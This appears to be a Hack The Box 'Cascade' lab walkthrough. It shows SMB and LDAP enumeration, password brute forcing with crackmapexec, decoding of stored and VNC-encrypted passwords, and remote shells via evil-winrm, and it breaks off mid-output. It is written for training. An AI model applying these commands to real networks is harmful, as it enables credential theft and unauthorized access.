@@ -1,0 +1,990 @@
+HTB - CASCADE
+No webserver exploitation, pure smb enumeration, .net revversing of password encrypted in database.
+
+We add cascade to our /etc/hosts file.
+
+We will try to eenumerate smb and ldap
+SMB 
+- Usernames
+- Bruteforce
+- File shares
+
+LDAP 
+- Usernames
+- Other info
+
+We will start enumerating by using rpcclient first, we will first try anonymos authentication first.
+COMMAND:
+===================================================================================================
+rpcclient -U '' 10.10.10.182 
+===================================================================================================
+OUTPUT:
+===================================================================================================
+Enter WORKGROUP\'s password: 
+rpcclient $> enumdomusers
+user:[CascGuest] rid:[0x1f5]
+user:[arksvc] rid:[0x452]
+user:[s.smith] rid:[0x453]
+user:[r.thompson] rid:[0x455]
+user:[util] rid:[0x457]
+user:[j.wakefield] rid:[0x45c]
+user:[s.hickson] rid:[0x461]
+user:[j.goodhand] rid:[0x462]
+user:[a.turnbull] rid:[0x464]
+user:[e.crowe] rid:[0x467]
+user:[b.hanson] rid:[0x468]
+user:[d.burman] rid:[0x469]
+user:[BackupSvc] rid:[0x46a]
+user:[j.allen] rid:[0x46e]
+user:[i.croft] rid:[0x46f]
+rpcclient $> querydispinfo
+index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull	Name: Adrian Turnbull	Desc: (null)
+index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc	Name: ArkSvc	Desc: (null)
+index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson	Name: Ben Hanson	Desc: (null)
+index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc	Name: BackupSvc	Desc: (null)
+index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
+index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman	Name: David Burman	Desc: (null)
+index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe	Name: Edward Crowe	Desc: (null)
+index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft	Name: Ian Croft	Desc: (null)
+index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen	Name: Joseph Allen	Desc: (null)
+index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand	Name: John Goodhand	Desc: (null)
+index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield	Name: James Wakefield	Desc: (null)
+index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson	Name: Ryan Thompson	Desc: (null)
+index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson	Name: Stephanie Hickson	Desc: (null)
+index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith	Name: Steve Smith	Desc: (null)
+index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util	Name: Util	Desc: (null)
+
+===================================================================================================
+
+We now have a user list can place in a file and use for enumeration. users.lst 
+We can also now use crackmapexec to enumerate the shares.
+
+COMMAND:
+===================================================================================================
+cme smb 10.10.10.182 -u '' -p '' --shares
+===================================================================================================
+OUTPUT:
+===================================================================================================
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\: STATUS_ACCESS_DENIED 
+SMB         10.10.10.182    445    CASC-DC1         [-] Error enumerating shares: STATUS_ACCESS_DENIED
+===================================================================================================
+
+We also try smbclient, to see if a different tool can provide more info.
+COMMAND:
+===================================================================================================
+smbclient -L //10.10.10.182 -U '' -N
+===================================================================================================
+OUTPUT:
+===================================================================================================
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+===================================================================================================
+
+Since we did not get much info we can go ahead and try and bruteforce approcach and if we can't get
+results , then move on to ldap enumeration. We can also attempt extract the dates from which a user
+was created with the following from rpcclient:
+COMMAND:
+===================================================================================================
+rpcclient $> queryuser 0x469
+===================================================================================================
+OUTPUT:
+===================================================================================================
+	User Name   :	d.burman
+	Full Name   :	David Burman
+	Home Drive  :	
+	Dir Drive   :	
+	Profile Path:	
+	Logon Script:	MapDataDrive.vbs
+	Description :	
+	Workstations:	
+	Comment     :	
+	Remote Dial :
+	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
+	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
+	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
+	Password last set Time   :	Mon, 13 Jan 2020 11:36:13 EST
+	Password can change Time :	Mon, 13 Jan 2020 11:36:13 EST
+	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
+	unknown_2[0..31]...
+	user_rid :	0x469
+	group_rid:	0x201
+	acb_info :	0x00000210
+	fields_present:	0x00ffffff
+	logon_divs:	168
+	bad_password_count:	0x00000000
+	logon_count:	0x00000000
+	padding1[0..7]...
+	logon_hrs[0..21]...
+===================================================================================================
+
+January 2020 was the last time the password was changed for most users.
+
+Once we have generated a password list we can then go ahead and mutate it with hashcat.
+COMMAND:
+===================================================================================================
+hashcat --force pass.lst -r /usr/share/hashcat/rules/best64.rule --stdout > passwords
+===================================================================================================
+
+One of the things to check before running is to see if we can probe for the password policy on the
+windows server using crackmap.
+
+COMMAND:
+===================================================================================================
+cme smb 10.10.10.182 --pass-pol
+===================================================================================================
+OUTPUT:
+===================================================================================================
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] Dumping password info for domain: CASCADE
+SMB         10.10.10.182    445    CASC-DC1         Minimum password length: 5
+SMB         10.10.10.182    445    CASC-DC1         Password history length: None
+SMB         10.10.10.182    445    CASC-DC1         Maximum password age: Not Set
+SMB         10.10.10.182    445    CASC-DC1         
+SMB         10.10.10.182    445    CASC-DC1         Password Complexity Flags: 000000
+SMB         10.10.10.182    445    CASC-DC1         	Domain Refuse Password Change: 0
+SMB         10.10.10.182    445    CASC-DC1         	Domain Password Store Cleartext: 0
+SMB         10.10.10.182    445    CASC-DC1         	Domain Password Lockout Admins: 0
+SMB         10.10.10.182    445    CASC-DC1         	Domain Password No Clear Change: 0
+SMB         10.10.10.182    445    CASC-DC1         	Domain Password No Anon Change: 0
+SMB         10.10.10.182    445    CASC-DC1         	Domain Password Complex: 0
+SMB         10.10.10.182    445    CASC-DC1         
+SMB         10.10.10.182    445    CASC-DC1         Minimum password age: None
+SMB         10.10.10.182    445    CASC-DC1         Reset Account Lockout Counter: 30 minutes 
+SMB         10.10.10.182    445    CASC-DC1         Locked Account Duration: 30 minutes 
+SMB         10.10.10.182    445    CASC-DC1         Account Lockout Threshold: None
+SMB         10.10.10.182    445    CASC-DC1         Forced Log off Time: Not Set
+
+===================================================================================================
+
+As we can see there isn't an account threshold so we can go ahead and bruteforce all we want.
+Now we can attempt to bruteforce with crackmap.
+COMMAND:
+===================================================================================================
+cme smb 10.10.10.182 -u users -p passwords
+===================================================================================================
+OUTPUT:
+===================================================================================================
+===================================================================================================
+
+
+While that is going we can now try and gain more info through ldapsearch
+COMMAND:
+===================================================================================================
+ldapsearch -x -h 10.10.10.182 -s base namingcontexts
+===================================================================================================
+OUTPUT:
+===================================================================================================
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingContexts: DC=cascade,DC=local
+namingContexts: CN=Configuration,DC=cascade,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
+namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
+namingContexts: DC=ForestDnsZones,DC=cascade,DC=local
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+===================================================================================================
+
+It tells us what the actual domain is: DC=cascade,DC=local
+Now we can do a specific query on the domain and redirect the large output to a file.
+COMMAND:
+===================================================================================================
+ldapsearch -x -h 10.10.10.182 -s sub -b 'DC=cascade,DC=local' > dc-info.txt
+===================================================================================================
+OUTPUT:
+===================================================================================================
+...
+..
+.
+
+# WinRMRemoteWMIUsers__, Users, cascade.local
+dn: CN=WinRMRemoteWMIUsers__,CN=Users,DC=cascade,DC=local
+objectClass: top
+objectClass: group
+cn: WinRMRemoteWMIUsers__
+description: Members of this group can access WMI resources over management pr
+ otocols (such as WS-Management via the Windows Remote Management service). Th
+ is applies only to WMI namespaces that grant access to the user.
+distinguishedName: CN=WinRMRemoteWMIUsers__,CN=Users,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200113032124.0Z
+whenChanged: 20200113032124.0Z
+uSNCreated: 94238
+uSNChanged: 94240
+name: WinRMRemoteWMIUsers__
+objectGUID:: DyZzv+QnPUKdEFl0gz0nVg==
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZQQAAA==
+sAMAccountName: WinRMRemoteWMIUsers__
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Remote Management Users, Groups, UK, cascade.local
+dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: group
+cn: Remote Management Users
+member: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
+member: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+distinguishedName: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=lo
+ cal
+.
+..
+...
+===================================================================================================
+
+Since the output is quite large one thing we can do is try to find unique strings at the start of
+each line, we can achieve this by using sort and awk.
+COMMAND:
+===================================================================================================
+cat dc-info.txt | awk '{print $1}' | sort | uniq -c | sort -nr | grep ':'
+===================================================================================================
+OUTPUT:
+===================================================================================================
+...
+..
+.
+     1 msDFSR-Options:
+      1 msDFSR-MemberReferenceBL:
+      1 msDFSR-MemberReference:
+      1 msDFSR-FileFilter:
+      1 msDFSR-Enabled:
+      1 msDFSR-DirectoryFilter:
+      1 msDFSR-ContentSetGuid::
+      1 msDFSR-ComputerReferenceBL:
+      1 msDFSR-ComputerReference:
+      1 masteredBy:
+      1 localPolicyFlags:
+      1 dNSHostName:
+      1 cascadeLegacyPwd:
+      1 auditingPolicy::
+.
+..
+...
+===================================================================================================
+
+One of the things that sticks out is the "cascadeLegacyPwd" string, we can try to search for that 
+string in our info file and see what else is on the same line as the string.
+
+COMMAND:
+===================================================================================================
+less dc-info.txt
+\cascadeLegacy
+===================================================================================================
+OUTPUT:
+===================================================================================================
+...
+..
+.
+sAMAccountName: r.thompson
+sAMAccountType: 805306368
+userPrincipalName: r.thompson@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200126183918.0Z
+dSCorePropagationData: 20200119174753.0Z
+dSCorePropagationData: 20200119174719.0Z
+dSCorePropagationData: 20200119174508.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 132515655113308829
+msDS-SupportedEncryptionTypes: 0
+cascadeLegacyPwd: clk0bjVldmE=
+.
+..
+..
+===================================================================================================
+
+We see that the user r.thompson has a legacypassowrd on full display.
+Ryan Thompson: cascadeLegacyPwd: clk0bjVldmE=
+
+Looks like the password is base64 so we can attempt to undo it and see what the actual string is.
+
+COMMAND:
+===================================================================================================
+echo -n 'clk0bjVldmE=' | base64 -d
+===================================================================================================
+OUTPUT:
+===================================================================================================
+rY4n5eva
+===================================================================================================
+
+We can now attempt to use those creds and see if we can list shares
+COMMAND:
+===================================================================================================
+cme smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' --shares
+===================================================================================================
+OUTPUT:
+===================================================================================================
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
+SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
+SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
+SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
+SMB         10.10.10.182    445    CASC-DC1         Audit$                          
+SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
+SMB         10.10.10.182    445    CASC-DC1         Data            READ            
+SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
+SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
+SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
+SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 
+===================================================================================================
+
+We can also try to see if we can winrm which fails, but we can now attempt to read the data share
+which is of interest. We will attempt to spider the shares we have access to with the spider plus
+module.
+COMMAND:
+===================================================================================================
+cme smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' -M spider_plus
+===================================================================================================
+OUTPUT:
+===================================================================================================
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+SPIDER_P... 10.10.10.182    445    CASC-DC1         [*] Started spidering plus with option:
+SPIDER_P... 10.10.10.182    445    CASC-DC1         [*]        DIR: ['print$']
+SPIDER_P... 10.10.10.182    445    CASC-DC1         [*]        EXT: ['ico', 'lnk']
+SPIDER_P... 10.10.10.182    445    CASC-DC1         [*]       SIZE: 51200
+SPIDER_P... 10.10.10.182    445    CASC-DC1         [*]     OUTPUT: /tmp/cme_spider_plus
+
+===================================================================================================
+
+We can now copy the spider plus tmp file into a local file in our directory and explore the json
+formated contents: cp /tmp/cme_spider_plus/10.10.10.182.json r.thompson.spider.smb
+
+COMMAND:
+===================================================================================================
+jq . r.thompson.spider.smb
+===================================================================================================
+OUTPUT:
+===================================================================================================
+{
+  "Data": {
+    "IT/Email Archives/Meeting_Notes_June_2018.html": {
+      "atime_epoch": "2020-01-15 20:08:46",
+      "ctime_epoch": "2020-01-15 20:08:46",
+      "mtime_epoch": "2020-01-28 13:00:30",
+      "size": "2.46 KB"
+    },
+    "IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log": {
+      "atime_epoch": "2020-01-10 11:19:20",
+      "ctime_epoch": "2020-01-10 11:19:20",
+      "mtime_epoch": "2020-01-28 20:19:11",
+      "size": "1.27 KB"
+    },
+    "IT/Logs/DCs/dcdiag.log": {
+      "atime_epoch": "2020-01-10 11:17:30",
+      "ctime_epoch": "2020-01-10 11:17:30",
+      "mtime_epoch": "2020-01-26 17:22:05",
+      "size": "5.83 KB"
+    },
+    "IT/Temp/s.smith/VNC Install.reg": {
+      "atime_epoch": "2020-01-28 14:27:43",
+      "ctime_epoch": "2020-01-28 14:27:43",
+      "mtime_epoch": "2020-01-28 15:00:01",
+      "size": "2.62 KB"
+    }
+  },
+  "NETLOGON": {
+    "MapAuditDrive.vbs": {
+      "atime_epoch": "2020-01-15 16:45:08",
+      "ctime_epoch": "2020-01-15 16:45:08",
+      "mtime_epoch": "2020-01-15 16:50:14",
+      "size": "258 Bytes"
+    },
+===================================================================================================
+
+Now we have a long list of files and there timestamp modifications. Since we have viable info we 
+can look at the next step is to mount the data folder locally.
+
+COMMAND:
+===================================================================================================
+mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/Data /mnt/data
+===================================================================================================
+OUTPUT:
+===================================================================================================
+root@kali:~/htb/cascade# cd /mnt/data/
+root@kali:/mnt/data# ls
+Contractors  Finance  IT  Production  Temps
+===================================================================================================
+
+Now we can navigate through all those folders. And try find any interesting bits of info
+COMMAND:
+===================================================================================================
+root@kali:/mnt/data# find . -type f 2>/dev/null
+===================================================================================================
+OUTPUT:
+===================================================================================================
+root@kali:/mnt/data# find . -type f 2>/dev/null
+./IT/Email Archives/Meeting_Notes_June_2018.html
+./IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
+./IT/Logs/DCs/dcdiag.log
+./IT/Temp/s.smith/VNC Install.reg
+===================================================================================================
+
+We are able to find a couple of interetsing files. The email html file has info regarding the use
+of temp account that was used for data migaration which now appears to have beem deleted.
+INFO:
+===================================================================================================
+<p>-- We will be using a temporary account to
+perform all tasks related to the network migration and this account will be deleted at the end of
+2018 once the migration is complete. This will allow us to identify actions
+related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
+===================================================================================================
+
+We then check the registry file with vim and come to find a password encoded in hex.
+INFO:
+===================================================================================================
+...
+..
+.
+"QueryTimeout"=dword:0000001e
+"QueryAcceptOnTimeout"=dword:00000000
+"LocalInputPriorityTimeout"=dword:00000003
+"LocalInputPriority"=dword:00000000
+"BlockRemoteInput"=dword:00000000
+"BlockLocalInput"=dword:00000000
+"IpAccessControl"=""
+"RfbPort"=dword:0000170c
+"HttpPort"=dword:000016a8
+"DisconnectAction"=dword:00000000
+"AcceptRfbConnections"=dword:00000001
+"UseVncAuthentication"=dword:00000001
+"UseControlAuthentication"=dword:00000000
+"RepeatControlAuthentication"=dword:00000000
+"LoopbackOnly"=dword:00000000
+"AcceptHttpConnections"=dword:00000001
+"LogLevel"=dword:00000000
+"EnableFileTransfers"=dword:00000001
+"RemoveWallpaper"=dword:00000001
+"UseD3D"=dword:00000001
+"UseMirrorDriver"=dword:00000001
+"EnableUrlParams"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+.
+..
+...
+===================================================================================================
+
+We can go to cyberchef and have it decoded. The output does not appear to be clear so we can
+google tightvnc regsitry password decrypt. 
+URL: https://github.com/frizb/PasswordDecrypts
+Tight vncs decryption function uses a fixed key, "\x17\x52\x6b\x06\x23\x4e\x58\x07", vnc xors the hex
+with a static key. So we can do the xor oursleves since the static key is known.
+
+We will use mfsconsole to help the decryption
+COMMAND:
+===================================================================================================
+msfconsole
+===================================================================================================
+OUTPUT:
+===================================================================================================
+[*] Starting persistent handler(s)...
+msf6 > irb
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+
+irb: warn: can't alias jobs from irb_jobs.
+>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+=> "\x17Rk\x06#NX\a"
+>> require 'rex/proto/rfb'
+=> true
+>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
+=> "sT333ve2"
+===================================================================================================
+
+We now have the password 'sT333ve2'. We can run crackmap and just use the user list with the password
+we just got.
+
+
+COMMAND:
+==================================================================================================
+cme smb 10.10.10.182 -u users -p 'sT333ve2'
+==================================================================================================
+OUTPUT:
+==================================================================================================
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
+==================================================================================================
+
+We now know that s.smith has that password, we will attempt winrm and see if we can get a shell.
+
+COMMAND:
+==================================================================================================
+cme winrm 10.10.10.182 -u s.smith -p 'sT333ve2'
+==================================================================================================
+OUTPUT:
+==================================================================================================
+WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
+==================================================================================================
+
+We indeed can use winrm with the smith user so we can now evilwinrm to get a shell for use.
+
+COMMAND:
+==================================================================================================
+evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2'
+==================================================================================================
+OUTPUT:
+==================================================================================================
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name       SID
+=============== ==============================================
+cascade\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+*Evil-WinRM* PS C:\Users\s.smith\Documents> net user s.smith /domain
+User name                    s.smith
+Full Name                    Steve Smith
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/28/2020 7:58:05 PM
+Password expires             Never
+Password changeable          1/28/2020 7:58:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 MapAuditDrive.vbs
+User profile
+Home directory
+Last logon                   12/4/2020 3:38:55 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Audit Share          *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+==================================================================================================
+
+Now we can use spider plus again to examine more files that are accesible to the s.smith user
+
+COMMAND:
+==================================================================================================
+cme smb 10.10.10.182 -u 's.smith' -p 'sT333ve2' -M spider_plus
+cp /tmp/cme_spider_plus/10.10.10.182.json s.smith.spider.smb
+jq . s.smith.spider.smb
+==================================================================================================
+OUTPUT:
+==================================================================================================
+{
+  "Audit$": {
+    "CascAudit.exe": {
+      "atime_epoch": "2020-01-15 17:11:27",
+      "ctime_epoch": "2020-01-13 15:01:50",
+      "mtime_epoch": "2020-01-28 16:47:08",
+      "size": "13 KB"
+    },
+    "CascCrypto.dll": {
+      "atime_epoch": "2020-01-15 17:02:44",
+      "ctime_epoch": "2020-01-15 17:02:44",
+      "mtime_epoch": "2020-01-29 13:01:26",
+      "size": "12 KB"
+    },
+    "DB/Audit.db": {
+      "atime_epoch": "2020-01-15 18:12:26",
+      "ctime_epoch": "2020-01-15 18:12:26",
+      "mtime_epoch": "2020-01-28 16:43:18",
+      "size": "24 KB"
+    },
+    "RunAudit.bat": {
+      "atime_epoch": "2020-01-28 18:28:55",
+      "ctime_epoch": "2020-01-28 18:28:55",
+      "mtime_epoch": "2020-01-28 18:29:47",
+      "size": "45 Bytes"
+    },
+==================================================================================================
+
+We can now see the audit directory alongside all the files it has stored. We will mount this 
+bu using the newly obtained credentials
+
+COMMAND:
+==================================================================================================
+mkdir /mnt/audit
+mount -t cifs -o 'user=s.smith,password=sT333ve2' //10.10.10.182/audit$ /mnt/audit
+==================================================================================================
+OUTPUT:
+==================================================================================================
+root@kali:/mnt/audit# file CascAudit.exe 
+CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+
+==================================================================================================
+
+We analze the db directory and see what we get.
+
+COMMAND:
+==================================================================================================
+root@kali:/mnt/audit# cd DB/
+root@kali:/mnt/audit/DB# ls
+Audit.db
+root@kali:/mnt/audit/DB# sqlite3 Audit.db .dump
+==================================================================================================
+OUTPUT:
+==================================================================================================
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE IF NOT EXISTS "Ldap" (
+	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
+	"uname"	TEXT,
+	"pwd"	TEXT,
+	"domain"	TEXT
+);
+INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
+CREATE TABLE IF NOT EXISTS "Misc" (
+	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
+	"Ext1"	TEXT,
+	"Ext2"	TEXT
+);
+CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
+	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
+	"Username"	TEXT,
+	"Name"	TEXT,
+	"DistinguishedName"	TEXT
+);
+INSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\n',char(10)),'CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');
+INSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\n',char(10)),'CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');
+INSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\n',char(10)),'CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');
+DELETE FROM sqlite_sequence;
+INSERT INTO sqlite_sequence VALUES('Ldap',2);
+INSERT INTO sqlite_sequence VALUES('DeletedUserAudit',10);
+COMMIT;
+
+==================================================================================================
+
+We find what looks like a userame and password of 'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw=='
+The password looks encrypted using a hexdump doesn't yield any results.
+We should analyze the execitable to see how it decrypts. If we take a look at the bat file, it tells
+us that the you run the executable with an arguement of where the database was.
+
+INFO:
+=================================================================================================
+root@kali:/mnt/audit# cat RunAudit.bat 
+CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+=================================================================================================
+
+We will need to analyze this file from a windows box, so will create an smb server that can be 
+accessed from our windows box and once all the files have been transferred we will us dnspy from
+within commando vm to try and decrypt the encrypted password.
+COMMAND:
+==================================================================================================
+impacket-smbserver -smb2support test $(pwd) -username test -password test
+==================================================================================================
+
+Once we have the files copied over we can now anlayze and modyify them using dnspy. Once loaded
+by choosing the crypto dll, we can look at the crypto function. From looking at the function
+we have a static iv and we could write our own aes function to decrypt the password or modify the 
+code and have it print it out. 
+
+We will load the executable into dnspy and from there try to find where the crypto call is being 
+made probably main module and then make breakpoints from when it is being called.
+
+The breakpoint is set to where the decryptString function is at in the main module and we specify
+that path of where auditdb is.
+
+Once we run it and step over the function, we will be able to get the clear text password:
+INFO:
+==================================================================================================
+		CascCrypto.Crypto.DecryptString returned	"w3lc0meFr31nd\0\0\0"	string
+==================================================================================================
+
+Creds: arksvc:w3lc0meFr31nd
+
+Now we can try to winrm with the user arksvc
+COMMAND:
+==================================================================================================
+evil-winrm -i 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
+==================================================================================================
+OUTPUT:
+==================================================================================================
+*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID
+============== ==============================================
+cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
